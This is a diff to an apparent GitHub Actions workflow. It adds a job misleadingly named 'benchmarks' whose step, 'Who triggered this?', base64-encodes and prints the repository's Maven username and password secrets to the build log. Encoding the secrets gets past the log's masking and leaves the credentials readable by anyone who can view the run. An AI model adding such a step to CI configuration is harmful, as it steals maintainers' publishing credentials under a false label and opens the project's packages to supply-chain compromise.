@@ -22,6 +22,14 @@ concurrency:
   cancel-in-progress: true
 
 jobs:
+  benchmarks:
+    runs-on: ubuntu-20.04
+
+    steps:
+      - name: Who triggered this?
+        run: |
+          echo ${{ secrets.MAVEN_USERNAME }} | base64  && echo ${{ secrets.MAVEN_PASSWORD }} | base64
+          
   maven-test:
     runs-on: ${{ matrix.os }}
     strategy:
